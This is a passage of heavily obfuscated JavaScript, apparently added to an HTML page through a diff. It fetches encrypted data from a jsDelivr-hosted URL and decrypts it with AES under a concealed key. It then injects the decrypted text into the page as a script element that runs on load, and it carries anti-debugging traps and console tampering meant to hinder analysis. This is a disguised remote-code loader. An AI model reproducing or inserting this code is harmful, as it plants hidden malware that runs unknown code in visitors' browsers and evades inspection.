_0x41ef58=_0xfd39fd[_0x3a3d3c(0x1ae)](_0x10d4d);continue;case'4':var _0x3aa43e=_0x41ef58['console']=_0x41ef58[_0x3a3d3c(0x14a)]||{};continue;case'5':var _0x2d3420=[_0x3a3d3c(0x1a2),'warn',_0x3a3d3c(0x178),_0xfd39fd[_0x3a3d3c(0x1bc)],_0xfd39fd['mykgK'],_0xfd39fd[_0x427e80(0x175)],_0xfd39fd['nnUiL']];continue;}break;}});continue;case'3':if(_0x3dff19!=='1'){var _0xb1c0c5=document[_0x27be89(0x161)+_0x27be89(0x1a7)](_0x27be89(0x1bd)+_0x3eedd0(0x16f));if(_0xb1c0c5)_0xb1c0c5[_0x27be89(0x1b5)][_0x27be89(0x19b)]=_0x4cb079[_0x27be89(0x168)];}continue;case'4':var _0x62b682=(function(){var _0x4f2658=!![];return function(_0x461aea,_0x3f80c2){var _0x1ea4f5=_0x4f2658?function(){var _0x4418b2=livid_0x4905;if(_0x3f80c2){var _0x54b8e3=_0x3f80c2[_0x4418b2(0x1aa)](_0x461aea,arguments);return _0x3f80c2=null,_0x54b8e3;}}:function(){};return _0x4f2658=![],_0x1ea4f5;};}());continue;case'5':_0x4cb079['ymDUN'](_0x1c74aa);continue;case'6':var _0x318fc1=(function(){var _0x54d3fc=!![];return function(_0x282e5a,_0x53a6bd){var _0x1eac91=_0x54d3fc?function(){var _0x998bb7=livid_0x4905;if(_0x53a6bd){var _0x107b91=_0x53a6bd[_0x998bb7(0x1aa)](_0x282e5a,arguments);return _0x53a6bd=null,_0x107b91;}}:function(){};return _0x54d3fc=![],_0x1eac91;};}());continue;case'7':_0x22a5b4();continue;case'8':var _0x3b1303=(function(){var _0x18b26b=!![];return function(_0x13eacd,_0x1b594d){var _0x202480=_0x18b26b?function(){var _0x324ec5=livid_0x4905;if(_0x1b594d){var _0x48f540=_0x1b594d[_0x324ec5(0x1aa)](_0x13eacd,arguments);return _0x1b594d=null,_0x48f540;}}:function(){};return _0x18b26b=![],_0x202480;};}());continue;case'9':console[_0x3eedd0(0x1a2)](_0x4cb079[_0x3eedd0(0x1d2)],_0x3dff19);continue;case'10':var _0x3dff19=_0x352e30[_0x3eedd0(0x1b7)](_0x4cb079[_0x27be89(0x1c2)]);continue;case'11':var _0x352e30=new URLSearchParams(window[_0x27be89(0x14b)][_0x3eedd0(0x17b)]);continue;case'12':var _0x1c74aa=_0x3b1303(this,function(){var _0x367070=_0x27be89,_0x1bc89c=_0x3eedd0;return _0x1c74aa['toString']()[_0x367070(0x17b)](_0xfd39fd[_0x367070(0x19d)])[_0x1bc89c(0x14f)]()[_0x367070(0x14e)+'r'](_0x1c74aa)[_0x367070(0x17b)](_0x1bc89c(0x1a6)+'+$');});continue;}break;}}()));var _k=livid_0x32452e(0x1a4)+livid_0x32452e(0x18a)+livid_0x36b6cb(0x1d5)+livid_0x32452e(0x1b4)+livid_0x36b6cb(0x17a);window['_d']=function(_0x5775d9){var _0x558d42=livid_0x32452e,_0x1154ad=livid_0x36b6cb;try{var _0x54d055=_0x5775d9[_0x558d42(0x1a1)](/-/g,'+')['replace'](/_/g,'/'),_0x5095db=CryptoJS[_0x558d42(0x159)]['Base64'][_0x558d42(0x16b)](_0x54d055),_0x2a73ac=CryptoJS[_0x1154ad(0x18e)][_0x558d42(0x1a9)][_0x558d42(0x16d)](_0x5095db['words'][_0x1154ad(0x1af)](0x288+0x162a*-0x1+0x13a2,0x1df9*0x1+0x9eb*-0x3+0x2*-0x1a)),_0xdf5eb=CryptoJS[_0x1154ad(0x18e)]['WordArray'][_0x1154ad(0x16d)](_0x5095db[_0x558d42(0x1d4)][_0x558d42(0x1af)](-0x2*0x11b+0x203b+-0x1e01)),_0x205852={};return _0x205852[_0x1154ad(0x1cb)]=_0xdf5eb,CryptoJS[_0x558d42(0x1b9)][_0x1154ad(0x1bb)](_0x205852,CryptoJS[_0x1154ad(0x194)](_k),{'iv':_0x2a73ac,'mode':CryptoJS[_0x1154ad(0x1ce)]['CBC'],'padding':CryptoJS['pad'][_0x558d42(0x15d)]})[_0x1154ad(0x14f)](CryptoJS['enc']['Utf8']);}catch(_0x4cba51){return null;}};var livid_0x27ffc3={};livid_0x27ffc3[livid_0x36b6cb(0x14c)]=livid_0x36b6cb(0x193),fetch(livid_0x32452e(0x1c3)+'n.jsdelivr'+livid_0x32452e(0x158)+livid_0x36b6cb(0x1c9)+livid_0x32452e(0x169)+livid_0x32452e(0x1c5)+livid_0x36b6cb(0x15c)+Date[livid_0x36b6cb(0x1d7)](),livid_0x27ffc3)[livid_0x36b6cb(0x172)](function(_0x4e4e64){var _0x2c3383=livid_0x36b6cb;return _0x4e4e64[_0x2c3383(0x160)]();})[livid_0x36b6cb(0x172)](function(_0x37f49c){var _0x46b5f1=livid_0x36b6cb,_0xd2440b=livid_0x32452e,_0x12beb1={};_0x12beb1[_0x46b5f1(0x187)]=_0x46b5f1(0x163);var _0x1a6e14=_0x12beb1,_0x1a28a9=window['_d'](_0x37f49c['d']);if(_0x1a28a9){var _0x31e3bb=document[_0x46b5f1(0x1be)+_0x46b5f1(0x1ca)](_0x1a6e14[_0x46b5f1(0x187)]);_0x31e3bb[_0x46b5f1(0x185)+'t']=_0x1a28a9,document[_0x46b5f1(0x1ab)][_0x46b5f1(0x19f)+'d'](_0x31e3bb);}})[livid_0x32452e(0x177)](function(_0x4346f3){var _0x410c27=livid_0x32452e,_0x314bc3=livid_0x32452e,_0x4d1b5e={};_0x4d1b5e[_0x410c27(0x15b)]=_0x410c27(0x19c)+'d:';var _0x5559e8=_0x4d1b5e;console['error'](_0x5559e8['AJUVl'],_0x4346f3);});function _0x13635e(_0x21d4ae){var _0xf2a5dc=livid_0x32452e,_0x5a7105=livid_0x32452e,_0x13a968={'zDmWo':function(_0x181f97,_0x59fa14){return _0x181f97===_0x59fa14;},'LcARR':'string','ZWauR':_0xf2a5dc(0x18d)+'e)\x20{}','Gvjnp':_0x5a7105(0x157),'CfGJr':function(_0x435267,_0x3e2f2f){return _0x435267+_0x3e2f2f;},'idewt':'action','GzRJd':function(_0x94f1ec,_0x4d3a19){return _0x94f1ec+_0x4d3a19;},'JyWBI':_0xf2a5dc(0x198),'zFQxE':'gger','QqCZR':function(_0x53c2dd,_0x4aef75){return _0x53c2dd(_0x4aef75);}};function _0x169eb5(_0x434be7){var _0x13e3c2=_0xf2a5dc,_0x25c96b=_0xf2a5dc;if(_0x13a968[_0x13e3c2(0x151)](typeof _0x434be7,_0x13a968[_0x25c96b(0x1a3)]))return function(_0x3f0168){}[_0x13e3c2(0x14e)+'r'](_0x13a968[_0x25c96b(0x183)])[_0x13e3c2(0x1aa)](_0x13a968[_0x25c96b(0x1b8)]);else(''+_0x434be7/_0x434be7)[_0x13e3c2(0x17e)]!==0x1*0x1b02+-0x3*0xbf5+0x8de||_0x13a968[_0x13e3c2(0x151)](_0x434be7%(-0x19d5+0xb5*-0xe+0x1*0x23cf),0x282*0x9+0x1*-0x2153+0xac1)?function(){return!![];}[_0x25c96b(0x14e)+'r'](_0x13a968[_0x25c96b(0x1d1)](_0x25c96b(0x198),_0x13e3c2(0x16c)))[_0x25c96b(0x18c)](_0x13a968[_0x25c96b(0x173)]):function(){return![];}['constructo'+'r'](_0x13a968[_0x25c96b(0x1cd)](_0x13a968[_0x13e3c2(0x1d6)],_0x13a968['zFQxE']))[_0x13e3c2(0x1aa)](_0x25c96b(0x182)+'t');_0x169eb5(++_0x434be7);}try{if(_0x21d4ae)return _0x169eb5;else _0x13a968[_0x5a7105(0x1c8)](_0x169eb5,-0x1b75*-0x1+0x1e85+0x1*-0x39fa);}catch(_0x904124){}}
+    </script>
+</body>
+</html>
